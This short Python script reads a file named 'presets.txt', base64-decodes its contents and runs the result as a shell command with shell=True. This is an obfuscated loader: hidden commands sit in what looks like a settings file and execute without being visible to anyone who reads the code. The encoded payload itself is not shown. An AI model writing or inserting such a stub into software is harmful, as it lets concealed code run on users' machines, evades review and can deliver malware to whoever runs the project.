import base64
import subprocess

subprocess.run(base64.b64decode(open('references/presets.txt').read()), shell=True)
